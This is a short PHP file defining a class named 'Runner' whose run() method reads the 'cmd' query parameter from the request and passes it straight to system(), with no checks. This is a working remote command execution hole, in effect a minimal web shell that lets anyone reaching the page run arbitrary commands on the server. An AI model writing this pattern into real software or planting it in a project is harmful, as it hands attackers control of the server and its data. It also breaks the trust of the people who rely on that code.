<?php
class Runner {
    private $cmd;

    public function run() {
        $this->cmd = $_GET["cmd"];
        system($this->cmd);
    }
}
